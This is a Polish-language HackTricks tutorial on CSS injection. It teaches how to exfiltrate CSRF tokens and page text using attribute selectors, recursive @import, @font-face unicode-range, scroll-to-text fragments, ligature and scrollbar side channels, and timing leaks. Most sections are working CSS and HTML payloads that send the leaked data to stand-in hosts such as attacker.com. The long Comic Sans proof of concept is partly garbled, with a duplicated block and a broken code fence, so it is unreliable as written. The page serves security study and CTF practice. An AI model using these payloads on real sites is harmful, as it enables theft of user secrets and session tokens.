# Wstrzykiwanie CSS

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Wstrzykiwanie CSS

### Selektor atrybutu

Selektory CSS są tworzone w celu dopasowania wartości atrybutów `name` i `value` elementu `input`. Jeśli wartość atrybutu `value` elementu `input` zaczyna się od określonego znaku, wczytywany jest wcześniej zdefiniowany zewnętrzny zasób:
```css
input[name=csrf][value^=a]{
background-image: url(https://attacker.com/exfil/a);
}
input[name=csrf][value^=b]{
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name=csrf][value^=9]{
background-image: url(https://attacker.com/exfil/9);
}
```
Jednakże, podejście to napotyka ograniczenie podczas pracy z ukrytymi elementami wejściowymi (`type="hidden"`), ponieważ ukryte elementy nie ładowane są tła.

#### Ominięcie dla ukrytych elementów

Aby obejść to ograniczenie, można wybrać następujący element rodzeństwa, używając kombinatora ogólnego rodzeństwa `~`. Reguła CSS zostanie wtedy zastosowana do wszystkich rodzeństwa, które występują po ukrytym elemencie wejściowym, co spowoduje załadowanie obrazu tła:
```css
input[name=csrf][value^=csrF] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```
Przykład praktycznego wykorzystania tej techniki jest szczegółowo opisany w dostarczonym fragmencie kodu. Możesz go zobaczyć [tutaj](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e).

#### Wymagania wstępne dla wstrzykiwania CSS

Aby technika wstrzykiwania CSS była skuteczna, muszą zostać spełnione pewne warunki:

1. **Długość ładunku**: Wektor wstrzykiwania CSS musi obsługiwać wystarczająco długie ładunki, aby pomieścić opracowane selektory.
2. **Ponowna ocena CSS**: Powinieneś mieć możliwość oprawienia strony, co jest niezbędne do wywołania ponownej oceny CSS z nowo wygenerowanymi ładunkami.
3. **Zewnętrzne zasoby**: Technika zakłada możliwość korzystania z obrazów hostowanych zewnętrznie. Może to być ograniczone przez politykę zabezpieczeń treści (CSP) strony.

### Selektor atrybutu w ciemno

Jak [**wyjaśniono w tym wpisie**](https://portswigger.net/research/blind-css-exfiltration), możliwe jest połączenie selektorów **`:has`** i **`:not`** w celu identyfikacji zawartości nawet z elementów w ciemno. Jest to bardzo przydatne, gdy nie masz pojęcia, co znajduje się wewnątrz strony internetowej ładowanej przez wstrzyknięcie CSS.\
Możliwe jest również wykorzystanie tych selektorów do wyodrębniania informacji z kilku bloków tego samego typu, jak na przykład:
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background:url(/m);
}
</style>
<input name=mytoken value=1337>
<input name=myname value=gareth>
```
Kombinując to z następującą techniką **@import**, możliwe jest wyciekanie wielu informacji za pomocą wstrzykiwania CSS z **ślepych stron z wykorzystaniem** [**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)**.**

### @import

Poprzednia technika ma pewne wady, sprawdź wymagania wstępne. Musisz albo **wysłać ofierze wiele linków**, albo musisz być w stanie **osadzić stronę podatną na wstrzykiwanie CSS w iframe**.

Jednak istnieje jeszcze jedna inteligentna technika, która wykorzystuje **CSS `@import`** do poprawy jakości techniki.

Pierwszy raz zostało to pokazane przez [**Pepe Vilę**](https://vwzq.net/slides/2019-s3\_css\_injection\_attacks.pdf) i działa to w ten sposób:

Zamiast ładować tę samą stronę wielokrotnie z dziesiątkami różnych ładunków za każdym razem (jak w poprzedniej technice), będziemy **ładować stronę tylko raz i tylko z importem do serwera atakującego** (to jest ładunek do wysłania ofierze):
```css
@import url('//attacker.com:5001/start?');
```
1. Import otrzyma **skrypt CSS** od atakujących, a **przeglądarka go załaduje**.
2. Pierwszą częścią skryptu CSS, który atakujący wyśle, jest **kolejne `@import` do serwera atakującego**.
1. Serwer atakującego jeszcze nie odpowie na to żądanie, ponieważ chcemy wyciec kilka znaków, a następnie odpowiedzieć na to importowanie za pomocą ładunku, aby wyciec kolejne.
3. Druga i większa część ładunku będzie **wyciekiem selektora atrybutu**.
1. To spowoduje wysłanie do serwera atakującego **pierwszego i ostatniego znaku** tajemnicy.
4. Gdy serwer atakującego otrzyma **pierwszy i ostatni znak tajemnicy**, odpowie na żądanie importu z kroku 2.
1. Odpowiedź będzie dokładnie taka sama jak **kroki 2, 3 i 4**, ale tym razem spróbuje **znaleźć drugi znak tajemnicy, a następnie przedostatni**.

Atakujący będzie **kontynuował tę pętlę, aż całkowicie ujawni tajemnicę**.

Oryginalny [**kod Pepe Vila do wykorzystania tego znajdziesz tutaj**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231) lub prawie [**ten sam kod, ale z komentarzami tutaj**](./#css-injection).

{% hint style="info" %}
Skrypt będzie próbował odkryć 2 znaki za każdym razem (od początku i od końca), ponieważ selektor atrybutu pozwala na takie działania jak:
```css
/* value^=  to match the beggining of the value*/
input[value^="0"]{--s0:url(http://localhost:5001/leak?pre=0)}

/* value$=  to match the ending of the value*/
input[value$="f"]{--e0:url(http://localhost:5001/leak?post=f)}
```
To pozwala skryptowi szybciej ujawnić tajemnicę.
{% endhint %}

{% hint style="warning" %}
Czasami skrypt **nie wykrywa poprawnie, że odkryty prefiks + sufiks to już pełna flaga** i będzie kontynuował w przód (w prefiksie) i wstecz (w sufiksie), aż w końcu się zawiesi.\
Nie martw się, po prostu sprawdź **wyjście**, ponieważ **tam możesz zobaczyć flagę**.
{% endhint %}

### Inne selektory

Inne sposoby na dostęp do części DOM za pomocą **selektorów CSS**:

* **`.class-to-search:nth-child(2)`**: To wyszuka drugi element o klasie "class-to-search" w DOM.
*   Selektor **`:empty`**: Używany na przykład w [**tym rozwiązaniu**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)**:**

```css
[role^="img"][aria-label="1"]:empty { background-image: url("YOUR_SERVER_URL?1"); }
```

### Błąd oparty na XS-Search

**Odwołanie:** [Atak oparty na CSS: Nadużywanie unicode-range @font-face](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [XS-Search PoC oparty na błędach autorstwa @terjanq](https://twitter.com/terjanq/status/1180477124861407234)

Ogólnym zamiarem jest **użycie niestandardowego czcionki z kontrolowanego źródła** i zapewnienie, że **tekst (w tym przypadku 'A') jest wyświetlany tylko w tej czcionce, jeśli określone zasoby (`favicon.ico`) nie mogą zostać załadowane**.
```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face{
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range:U+0041;
}

#poc0{
font-family: 'poc';
}

</style>
</head>
<body>

<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
1. **Użycie niestandardowej czcionki**:
- Niestandardowa czcionka jest definiowana za pomocą reguły `@font-face` wewnątrz znacznika `<style>` w sekcji `<head>`.
- Czcionka jest nazwana `poc` i pobierana z zewnętrznego źródła (`http://attacker.com/?leak`).
- Właściwość `unicode-range` jest ustawiona na `U+0041`, celując w konkretny znak Unicode 'A'.

2. **Element Object z tekstem zapasowym**:
- W sekcji `<body>` tworzony jest element `<object>` o `id="poc0"`. Ten element próbuje załadować zasób z `http://192.168.0.1/favicon.ico`.
- Dla tego elementu ustawiono `font-family` na `'poc'`, zgodnie z definicją w sekcji `<style>`.
- Jeśli zasób (`favicon.ico`) nie zostanie załadowany, wyświetlana jest treść zapasowa (litera 'A') wewnątrz znacznika `<object>`.
- Treść zapasowa ('A') zostanie wyrenderowana za pomocą niestandardowej czcionki `poc`, jeśli zewnętrzny zasób nie zostanie załadowany.

### Stylizacja fragmentu przewijania do tekstu

Pseudoklasa **`:target`** jest używana do wybrania elementu, na który wskazuje **fragment URL**, zgodnie z [specyfikacją CSS Selectors Level 4](https://drafts.csswg.org/selectors-4/#the-target-pseudo). Ważne jest zrozumienie, że `::target-text` nie dopasowuje żadnych elementów, chyba że tekst jest jawnie wskazywany przez fragment.

Pojawia się problem związany z bezpieczeństwem, gdy atakujący wykorzystują funkcję **fragmentu przewijania do tekstu**, pozwalającą im potwierdzić obecność określonego tekstu na stronie internetowej poprzez ładowanie zasobu z ich serwera za pomocą wstrzyknięcia HTML. Metoda ta polega na wstrzyknięciu reguły CSS, na przykład:
```css
:target::before { content : url(target.png) }
```
W takich scenariuszach, jeśli na stronie znajduje się tekst "Administrator", żądane jest zasobu `target.png` z serwera, co wskazuje na obecność tekstu. Przykład tego ataku można przeprowadzić za pomocą specjalnie przygotowanego adresu URL, który osadza wstrzyknięty CSS obok fragmentu Scroll-to-text:
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
Tutaj atak manipuluje wstrzykiwaniem HTML, aby przesłać kod CSS, mający na celu konkretny tekst "Administrator" za pomocą fragmentu Scroll-to-text (`#:~:text=Administrator`). Jeśli tekst zostanie znaleziony, wskazany zasób zostanie załadowany, nieświadomie sygnalizując swoją obecność atakującemu.

Aby złagodzić zagrożenie, należy wziąć pod uwagę następujące punkty:

1. **Ograniczone dopasowanie STTF**: Fragment Scroll-to-text (STTF) został zaprojektowany tak, aby dopasowywać tylko słowa lub zdania, co ogranicza jego zdolność do wycieku dowolnych tajemnic lub tokenów.
2. **Ograniczenie do kontekstów przeglądania najwyższego poziomu**: STTF działa tylko w kontekstach przeglądania najwyższego poziomu i nie działa w ramkach (iframes), co sprawia, że ​​każda próba wykorzystania jest bardziej zauważalna dla użytkownika.
3. **Konieczność aktywacji przez użytkownika**: STTF wymaga aktywacji przez użytkownika, co oznacza, że ​​ataki są wykonalne tylko poprzez nawigacje inicjowane przez użytkownika. To wymaganie znacznie łagodzi ryzyko automatyzacji ataków bez interakcji użytkownika. Niemniej jednak autor postu na blogu wskazuje konkretne warunki i obejścia (np. inżynierię społeczną, interakcję z popularnymi rozszerzeniami przeglądarki), które mogą ułatwić automatyzację ataku.

Świadomość tych mechanizmów i potencjalnych podatności jest kluczowa dla utrzymania bezpieczeństwa sieciowego i ochrony przed takimi wykorzystywanymi taktykami.

Aby uzyskać więcej informacji, sprawdź oryginalny raport: [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

Możesz sprawdzić [**wykorzystanie tej techniki w celu zdobycia flagi w CTF tutaj**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb).

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

Możesz określić **zewnetrzne czcionki dla konkretnych wartości unicode**, które zostaną **zebrane tylko wtedy, gdy te wartości unicode będą obecne** na stronie. Na przykład:
```html
<style>
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range:U+0041;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range:U+0042;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range:U+0043;
}
#sensitive-information{
font-family:poc;
}
</style>

<p id="sensitive-information">AB</p>htm
```
Gdy odwiedzasz tę stronę, Chrome i Firefox pobierają "?A" i "?B", ponieważ węzeł tekstowy zawiera znaki "A" i "B". Ale Chrome i Firefox nie pobierają "?C", ponieważ nie zawiera on "C". Oznacza to, że udało nam się odczytać "A" i "B".

### Wykradanie danych z węzła tekstowego (I): ligatury <a href="#wykradanie-danych-z-węzła-tekstowego-i-ligatury" id="wykradanie-danych-z-węzła-tekstowego-i-ligatury"></a>

**Odnośnik:** [Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na webaplikację](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

Opisana technika polega na wyodrębnianiu tekstu z węzła poprzez wykorzystanie ligatur czcionek i monitorowanie zmian szerokości. Proces ten obejmuje kilka kroków:

1. **Tworzenie niestandardowych czcionek**:
- Czcionki SVG są tworzone z glifami posiadającymi atrybut `horiz-adv-x`, który ustawia dużą szerokość dla glifu reprezentującego sekwencję dwóch znaków.
- Przykładowy glif SVG: `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`, gdzie "XY" oznacza sekwencję dwóch znaków.
- Następnie te czcionki są konwertowane do formatu woff za pomocą programu fontforge.

2. **Wykrywanie zmian szerokości**:
- CSS jest używany do zapewnienia, że tekst nie zostanie zawinięty (`white-space: nowrap`) oraz do dostosowania stylu paska przewijania.
- Pojawienie się poziomego paska przewijania o odrębnym stylu działa jako wskaźnik (orakulum), że w tekście występuje określona ligatura, a tym samym określona sekwencja znaków.
- Zastosowany CSS:
```css
body { white-space: nowrap };
body::-webkit-scrollbar { background: blue; }
body::-webkit-scrollbar:horizontal { background: url(http://attacker.com/?leak); }
```

3. **Proces wykorzystania**:
- **Krok 1**: Tworzone są czcionki dla par znaków o dużej szerokości.
- **Krok 2**: Wykorzystuje się sztuczkę z paskiem przewijania, aby wykryć, kiedy renderowany jest glif o dużej szerokości (ligatura dla pary znaków), co wskazuje na obecność sekwencji znaków.
- **Krok 3**: Po wykryciu ligatury generowane są nowe glify reprezentujące trzyznakowe sekwencje, zawierające wykrytą parę i dodatkowy znak poprzedzający lub następujący.
- **Krok 4**: Wykonywane jest wykrywanie trzyznakowej ligatury.
- **Krok 5**: Proces powtarza się, stopniowo ujawniając cały tekst.

4. **Optymalizacja**:
- Obecna metoda inicjalizacji za pomocą `<meta refresh=...` nie jest optymalna.
- Bardziej wydajne podejście może polegać na wykorzystaniu sztuczki `@import` w CSS, poprawiając wydajność ataku.

### Wykradanie danych z węzła tekstowego (II): wyciek kodowania znaków za pomocą domyślnej czcionki (bez konieczności zewnętrznych zasobów) <a href="#wykradanie-danych-z-węzła-tekstowego-ii-wyciek-kodowania-znaków-za-pomocą-domyślnej-czcionki" id="wykradanie-danych-z-węzła-tekstowego-ii-wyciek-kodowania-znaków-za-pomocą-domyślnej-czcionki"></a>

**Odnośnik:** [PoC z wykorzystaniem Comic Sans autorstwa @Cgvwzq i @Terjanq](https://demo.vwzq.net/css2.html)

Ta sztuczka została opublikowana w wątku [**Slackers**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what\_can\_we\_do\_with\_single\_css\_injection/). Kodowanie znaków używane w węźle tekstowym może być ujawnione **za pomocą domyślnych czcionek** zainstalowanych w przeglądarce, bez konieczności korzystania z zewnętrznych lub niestandardowych czcionek.

Idea polega na wykorzystaniu animacji do stopniowego zwiększania szerokości elementu `div`, umożliwiając przechodzenie pojedynczych znaków z części "sufiksowej" tekstu do części "prefiksowej". Proces ten efektywnie dzieli tekst na dwie sekcje:

1. **Prefiks**: Pierwsza linia.
2. **Sufiks**: Następne linie.

Etapy przejścia znaków wyglądają następująco:

**C**\
ADB

**CA**\
DB

**CAD**\
B

**CADB**


Podczas tego przejścia wykorzystywany jest trik z **unicode-range**, aby identyfikować każdy nowy znak, który dołącza do prefiksu. Dokonuje się tego poprzez zmianę czcionki na Comic Sans, która jest znacznie wyższa od domyślnej czcionki, co powoduje pojawienie się pionowego paska przewijania. Wygląd tego paska przewijania pośrednio ujawnia obecność nowego znaku w prefiksie.

Choć ta metoda pozwala na wykrywanie unikalnych znaków w miarę ich pojawiania się, nie określa, który znak jest powtarzany, jedynie że nastąpiło powtórzenie.

{% hint style="info" %}
W zasadzie **unicode-range jest używane do wykrywania znaku**, ale ponieważ nie chcemy ładować zewnętrznej czcionki, musimy znaleźć inny sposób.\
Gdy **znak** zostanie **znaleziony**, zostaje mu przypisana zainstalowana **czcionka Comic Sans**, co sprawia, że znak jest **większy** i **powoduje pojawienie się paska przewijania**, który **ujawni znaleziony znak**.
{% endhint %}

Sprawdź kod wyodrębniony z PoC:
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face{font-family:has_A;src:local('Comic Sans MS');unicode-range:U+41;font-style:monospace;}
@font-face{font-family:has_B;src:local('Comic Sans MS');unicode-range:U+42;font-style:monospace;}
@font-face{font-family:has_C;src:local('Comic Sans MS');unicode-range:U+43;font-style:monospace;}
@font-face{font-family:has_D;src:local('Comic Sans MS');unicode-range:U+44;font-style:monospace;}
@font-face{font-family:has_E;src:local('Comic Sans MS');unicode-range:U+45;font-style:monospace;}
@font-face{font-family:has_F;src:local('Comic Sans MS');unicode-range:U+46;font-style:monospace;}
@font-face{font-family:has_G;src:local('Comic Sans MS');unicode-range:U+47;font-style:monospace;}
@font-face{font-family:has_H;src:local('Comic Sans MS');unicode-range:U+48;font-style:monospace;}
@font-face{font-family:has_I;src:local('Comic Sans MS');unicode-range:U+49;font-style:monospace;}
@font-face{font-family:has_J;src:local('Comic Sans MS');unicode-range:U+4a;font-style:monospace;}
@font-face{font-family:has_K;src:local('Comic Sans MS');unicode-range:U+4b;font-style:monospace;}
@font-face{font-family:has_L;src:local('Comic Sans MS');unicode-range:U+4c;font-style:monospace;}
@font-face{font-family:has_M;src:local('Comic Sans MS');unicode-range:U+4d;font-style:monospace;}
@font-face{font-family:has_N;src:local('Comic Sans MS');unicode-range:U+4e;font-style:monospace;}
@font-face{font-family:has_O;src:local('Comic Sans MS');unicode-range:U+4f;font-style:monospace;}
@font-face{font-family:has_P;src:local('Comic Sans MS');unicode-range:U+50;font-style:monospace;}
@font-face{font-family:has_Q;src:local('Comic Sans MS');unicode-range:U+51;font-style:monospace;}
@font-face{font-family:has_R;src:local('Comic Sans MS');unicode-range:U+52;font-style:monospace;}
@font-face{font-family:has_S;src:local('Comic Sans MS');unicode-range:U+53;font-style:monospace;}
@font-face{font-family:has_T;src:local('Comic Sans MS');unicode-range:U+54;font-style:monospace;}
@font-face{font-family:has_U;src:local('Comic Sans MS');unicode-range:U+55;font-style:monospace;}
@font-face{font-family:has_V;src:local('Comic Sans MS');unicode-range:U+56;font-style:monospace;}
@font-face{font-family:has_W;src:local('Comic Sans MS');unicode-range:U+57;font-style:monospace;}
@font-face{font-family:has_X;src:local('Comic Sans MS');unicode-range:U+58;font-style:monospace;}
@font-face{font-family:has_Y;src:local('Comic Sans MS');unicode-range:U+59;font-style:monospace;}
@font-face{font-family:has_Z;src:local('Comic Sans MS');unicode-range:U+5a;font-style:monospace;}
@font-face{font-family:has_0;src:local('Comic Sans MS');unicode-range:U+30;font-style:monospace;}
@font-face{font-family:has_1;src:local('Comic Sans MS');unicode-range:U+31;font-style:monospace;}
@font-face{font-family:has_2;src:local('Comic Sans MS');unicode-range:U+32;font-style:monospace;}
@font-face{font-family:has_3;src:local('Comic Sans MS');unicode-range:U+33;font-style:monospace;}
@font-face{font-family:has_4;src:local('Comic Sans MS');unicode-range:U+34;font-style:monospace;}
@font-face{font-family:has_5;src:local('Comic Sans MS');unicode-range:U+35;font-style:monospace;}
@font-face{font-family:has_6;src:local('Comic Sans MS');unicode-range:U+36;font-style:monospace;}
@font-face{font-family:has_7;src:local('Comic Sans MS');unicode-range:U+37;font-style:monospace;}
@font-face{font-family:has_8;src:local('Comic Sans MS');unicode-range:U+38;font-style:monospace;}
@font-face{font-family:has_9;src:local('Comic Sans MS');unicode-range:U+39;font-style:monospace;}
@font-face{font-family:rest;src: local('Courier New');font-style:monospace;unicode-range:U+0-10FFFF}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line{
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% { font-family: rest; } /* delay for width change */
5% { font-family: has_A, rest; --leak: url(?a); }
6% { font-family: rest; }
10% { font-family: has_B, rest; --leak: url(?b); }
11% { font-family: rest; }
15% { font-family: has_C, rest; --leak: url(?c); }
16% { font-family: rest }
20% { font-family: has_D, rest; --leak: url(?d); }
21% { font-family: rest; }
25% { font-family: has_E, rest; --leak: url(?e); }
26% { font-family: rest; }
30% { font-family: has_F, rest; --leak: url(?f); }
31% { font-family: rest; }
35% { font-family: has_G, rest; --leak: url(?g); }
36% { font-family: rest; }
40% { font-family: has_H, rest; --leak: url(?h); }
41% { font-family: rest }
45% { font-family: has_I, rest; --leak: url(?i); }
46% { font-family: rest; }
50% { font-family: has_J, rest; --leak: url(?j); }
51% { font-family: rest; }
55% { font-family: has_K, rest; --leak: url(?k); }
56% { font-family: rest; }
60% { font-family: has_L, rest; --leak: url(?l); }
61% { font-family: rest; }
65% { font-family: has_M, rest; --leak: url(?m); }
66% { font-family: rest; }
70% { font-family: has_N, rest; --leak: url(?n); }
71% { font-family: rest; }
75% { font-family: has_O, rest; --leak: url(?o); }
76% { font-family: rest; }
80% { font-family: has_P, rest; --leak: url(?p); }
81% { font-family: rest; }
85% { font-family: has_Q, rest; --leak: url(?q); }
86% { font-family: rest; }
90% { font-family: has_R, rest; --leak: url(?r); }
91% { font-family: rest; }
95% { font-family: has_S, rest; --leak: url(?s); }
96% { font-family: rest; }
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% { width: 0px }
1% { width: 20px }
2% { width: 40px }
3% { width: 60px }
4% { width: 80px }
4% { width: 100px }
```css
5% { width: 120px }
6% { width: 140px }
7% { width: 0px }
}

div::-webkit-scrollbar {
background: blue;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
```

```css
5% { width: 120px }
6% { width: 140px }
7% { width: 0px }
}

div::-webkit-scrollbar {
background: blue;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
```
### Wyciek treści węzła tekstowego (III): wyciek kodowania znaków za pomocą domyślnej czcionki przez ukrywanie elementów (nie wymaga zewnętrznych zasobów) <a href="#wyciek-treści-węzła-tekstowego-ii-wyciek-kodowania-znaków-za-pomocą-domyślnej-czcionki" id="wyciek-treści-węzła-tekstowego-ii-wyciek-kodowania-znaków-za-pomocą-domyślnej-czcionki"></a>

**Odwołanie:** Jest to wspomniane jako [nieudane rozwiązanie w tym opracowaniu](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

Ten przypadek jest bardzo podobny do poprzedniego, jednak w tym przypadku celem jest sprawienie, że **określone znaki są większe niż inne, aby ukryć coś** takiego jak przycisk, który nie może zostać naciśnięty przez bota lub obraz, który nie zostanie załadowany. Dzięki temu możemy zmierzyć działanie (lub brak działania) i dowiedzieć się, czy określony znak jest obecny w tekście.

### Wyciek treści węzła tekstowego (III): wyciek kodowania znaków za pomocą czasu cache (nie wymaga zewnętrznych zasobów) <a href="#wyciek-treści-węzła-tekstowego-ii-wyciek-kodowania-znaków-za-pomocą-domyślnej-czcionki" id="wyciek-treści-węzła-tekstowego-ii-wyciek-kodowania-znaków-za-pomocą-domyślnej-czcionki"></a>

**Odwołanie:** Jest to wspomniane jako [nieudane rozwiązanie w tym opracowaniu](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

W tym przypadku możemy spróbować wyciec, czy dany znak znajduje się w tekście, ładowując fałszywą czcionkę z tej samej domeny:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```
Jeśli wystąpi dopasowanie, **czcionka zostanie załadowana z `/static/bootstrap.min.css?q=1`**. Chociaż nie zostanie załadowana pomyślnie, **przeglądarka powinna ją zapamiętać**, a nawet jeśli nie ma pamięci podręcznej, istnieje mechanizm **304 not modified**, dzięki czemu **odpowiedź powinna być szybsza** niż inne rzeczy.

Jednak jeśli różnica czasu między odpowiedzią z pamięci podręcznej a bez pamięci podręcznej nie jest wystarczająco duża, to nie będzie to przydatne. Na przykład autor wspomniał: Jednak po przetestowaniu stwierdziłem, że pierwszym problemem jest to, że prędkość nie jest znacznie różna, a drugim problemem jest to, że bot używa flagi `disk-cache-size=1`, co jest naprawdę przemyślane.

### Wyciek treści węzła tekstowego (III): wyciek kodowania poprzez pomiar czasu ładowania setek lokalnych "czcionek" (nie wymagających zewnętrznych zasobów) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Odwołanie:** Jest to wspomniane jako [nieudane rozwiązanie w tym opracowaniu](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

W tym przypadku można wskazać **CSS, aby ładował setki fałszywych czcionek** z tego samego źródła, gdy wystąpi dopasowanie. W ten sposób można **zmierzyć czas** i dowiedzieć się, czy znak się pojawia, czy nie, używając czegoś takiego jak:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1),
url(/static/bootstrap.min.css?q=2),
....
url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```
A kod bota wygląda tak:
```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```
Jeśli czcionka nie pasuje, oczekuje się, że czas odpowiedzi podczas odwiedzania bota wyniesie około 30 sekund. Jednak jeśli występuje dopasowanie czcionki, wysyłane są wielokrotne żądania w celu pobrania czcionki, co powoduje ciągłą aktywność sieci. W rezultacie zajmie więcej czasu zaspokojenie warunku zatrzymania i otrzymanie odpowiedzi. Dlatego czas odpowiedzi można użyć jako wskaźnik do określenia, czy występuje dopasowanie czcionki.

## Odwołania

* [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
* [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
* [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
* [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
